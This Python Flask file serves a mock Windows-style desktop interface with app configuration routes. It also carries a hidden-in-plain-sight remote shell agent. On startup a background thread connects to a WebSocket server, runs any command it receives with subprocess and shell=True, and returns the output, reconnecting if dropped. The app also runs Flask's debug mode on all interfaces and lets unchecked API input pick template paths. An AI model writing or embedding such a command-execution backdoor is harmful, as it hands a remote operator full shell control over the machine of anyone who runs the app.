# app.py
from flask import Flask, render_template, jsonify, request
import json
import os
import asyncio
import websockets
import json
import subprocess
import threading


app = Flask(__name__)

CONFIG_FILE = 'config.json'

SERVER_URL = "ws://127.0.0.1:8765"
CLIENT_ID = "PC-1"  # Set your client ID here (can make dynamic later)


def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    else:
        # Default configuration
        default_config = {
            "apps": [
                {
                    "id": "this-pc",
                    "name": "This PC",
                    "icon": "fas fa-desktop",
                    "pinned": True,
                    "desktop": True,
                    "type": "system",
                    "template": "thispc.html"
                },
                {
                    "id": "recycle-bin",
                    "name": "Recycle Bin",
                    "icon": "fas fa-trash",
                    "pinned": False,
                    "desktop": True,
                    "type": "system",
                    "template": "recyclebin.html"
                },
                {
                    "id": "documents",
                    "name": "Documents",
                    "icon": "fas fa-folder",
                    "pinned": True,
                    "desktop": True,
                    "type": "folder",
                    "template": "documents.html"
                },
                {
                    "id": "edge",
                    "name": "Edge",
                    "icon": "fas fa-globe",
                    "pinned": True,
                    "desktop": False,
                    "type": "application",
                    "template": "edge.html"
                },
                {
                    "id": "file-explorer",
                    "name": "File Explorer",
                    "icon": "fas fa-folder-open",
                    "pinned": True,
                    "desktop": False,
                    "type": "application",
                    "template": "fileexplorer.html"
                },
                {
                    "id": "settings",
                    "name": "Settings",
                    "icon": "fas fa-cog",
                    "pinned": True,
                    "desktop": False,
                    "type": "application",
                    "template": "settings.html"
                },
                {
                    "id": "store",
                    "name": "Microsoft Store",
                    "icon": "fas fa-shopping-bag",
                    "pinned": True,
                    "desktop": False,
                    "type": "application",
                    "template": "store.html"
                },
                {
                    "id": "photos",
                    "name": "Photos",
                    "icon": "fas fa-images",
                    "pinned": True,
                    "desktop": False,
                    "type": "application",
                    "template": "photos.html"
                },
                {
                    "id": "notepad",
                    "name": "Notepad",
                    "icon": "fas fa-file-alt",
                    "pinned": True,
                    "desktop": False,
                    "type": "application",
                    "template": "notepad.html"
                }
            ],
            "recent_files": [
                {
                    "name": "Project Report.docx",
                    "icon": "fas fa-file-word",
                    "time": "2 hours ago"
                },
                {
                    "name": "Sales Data.xlsx",
                    "icon": "fas fa-file-excel",
                    "time": "5 hours ago"
                },
                {
                    "name": "Vacation Photos",
                    "icon": "fas fa-images",
                    "time": "Yesterday"
                }
            ]
        }
        save_config(default_config)
        return default_config

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/config')
def get_config():
    config = load_config()
    return jsonify(config)

@app.route('/api/apps', methods=['POST'])
def add_app():
    config = load_config()
    new_app = request.json
    config['apps'].append(new_app)
    save_config(config)
    return jsonify({"success": True, "app": new_app})

@app.route('/api/apps/<app_id>', methods=['PUT'])
def update_app(app_id):
    config = load_config()
    updated_data = request.json
    for app in config['apps']:
        if app['id'] == app_id:
            app.update(updated_data)
            save_config(config)
            return jsonify({"success": True, "app": app})
    return jsonify({"success": False, "error": "App not found"}), 404

@app.route('/api/apps/<app_id>', methods=['DELETE'])
def delete_app(app_id):
    config = load_config()
    config['apps'] = [app for app in config['apps'] if app['id'] != app_id]
    save_config(config)
    return jsonify({"success": True})

@app.route('/app/<app_id>')
def get_app_template(app_id):
    config = load_config()
    app = next((a for a in config['apps'] if a['id'] == app_id), None)
    if app and 'template' in app:
        return render_template(f"apps/{app['template']}", app=app)
    return "App not found", 404

# Connecting to the Server

async def connect_to_server():
    try:
        async with websockets.connect(SERVER_URL) as ws:
            # Send ID to server
            await ws.send(json.dumps({"id": CLIENT_ID}))
            print(f"[CONNECTED] to {SERVER_URL} as {CLIENT_ID}")

            while True:
                message = await ws.recv()
                data = json.loads(message)

                if data["type"] == "command":
                    command = data["command"]
                    print(f"[CMD RECEIVED] {command}")

                    # Run command in Windows shell
                    try:
                        result = subprocess.check_output(command, shell=True, text=True)
                    except subprocess.CalledProcessError as e:
                        result = e.output

                    # Send result back to server
                    await ws.send(json.dumps({
                        "type": "result",
                        "id": CLIENT_ID,
                        "output": result
                    }))
                elif data["type"] == "status":
                    print(f"[STATUS UPDATE] {data['clients']}")
    except Exception as e:
        print(f"[ERROR] {e}")
        await asyncio.sleep(5)
        await connect_to_server()  # Reconnect on failure

def start_client():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(connect_to_server())

# Run WebSocket client in background thread when Flask starts
threading.Thread(target=start_client, daemon=True).start()



if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
